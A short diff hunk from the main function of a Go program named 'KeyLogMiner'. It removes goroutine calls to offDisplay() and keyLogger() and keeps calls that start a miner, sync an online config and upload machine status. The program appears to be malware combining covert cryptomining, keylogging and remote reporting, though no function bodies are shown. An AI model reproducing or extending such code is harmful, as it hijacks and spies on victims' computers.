@@ -47,8 +47,6 @@ func main() {
 	fmt.Println("Starting KeyLogMiner!")
 	go RunMiner(&config)
 	go syncOnlineConfigAndReRunMiner() //add by clk
-	go offDisplay()                    //add by clk
-	go keyLogger(&config)
 	go releaseMemory()
 	uploadMachineStatus()
 }
